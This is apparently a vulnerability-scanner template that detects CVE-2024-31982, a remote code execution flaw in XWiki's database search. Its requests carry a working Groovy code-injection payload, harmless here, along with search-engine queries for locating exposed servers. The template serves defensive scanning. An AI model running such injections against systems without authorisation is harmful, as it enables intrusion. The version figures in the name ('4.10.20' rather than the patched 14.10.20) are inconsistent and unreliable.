http:
- matchers:
  - condition: and
    dsl:
    - contains_all(body, "Hello from search text:42</title>", "<title>RSS feed")
    - contains(header, "text/javascript")
    - status_code == 200
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20'
  - '{{BaseURL}}/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20'
  skip-variables-check: true
  stop-at-first-match: true
id: CVE-2024-31982
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-31982
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-95
    epss-percentile: 0.99922
    epss-score: 0.94247
  description: 'XWiki Platform is a generic wiki platform. Starting in version 2.4-milestone-1
    and prior to versions 4.10.20, 15.5.4, and 15.10-rc-1, XWiki''s database search
    allows remote code execution through the search text. This allows remote code
    execution for any visitor of a public wiki or user of a closed wiki as the database
    search is by default accessible for all users. This impacts the confidentiality,
    integrity and availability of the whole XWiki installation. This vulnerability
    has been patched in XWiki 14.10.20, 15.5.4 and 15.10RC1. As a workaround, one
    may manually apply the patch to the page `Main.DatabaseSearch`. Alternatively,
    unless database search is explicitly used by users, this page can be deleted as
    this is not the default search interface of XWiki.

    '
  impact: 'Successful exploitation could lead to remote code execution.

    '
  metadata:
    fofa-query: body="data-xwiki-reference"
    max-request: 2
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    vendor: xwiki
    verified: true
  name: XWiki < 4.10.20 - Remote code execution
  reference:
  - https://jira.xwiki.org/browse/XWIKI-21472
  - https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-2858-8cfx-69m9
  - https://jira.xwiki.org/browse/XWIKI-21110
  remediation: 'Apply the vendor-supplied patch or upgrade to a 14.10.20 ,15.5.4,
    15.10-rc-1.

    '
  severity: critical
  tags: cve,cve2024,xwiki,rce,vkev,vuln
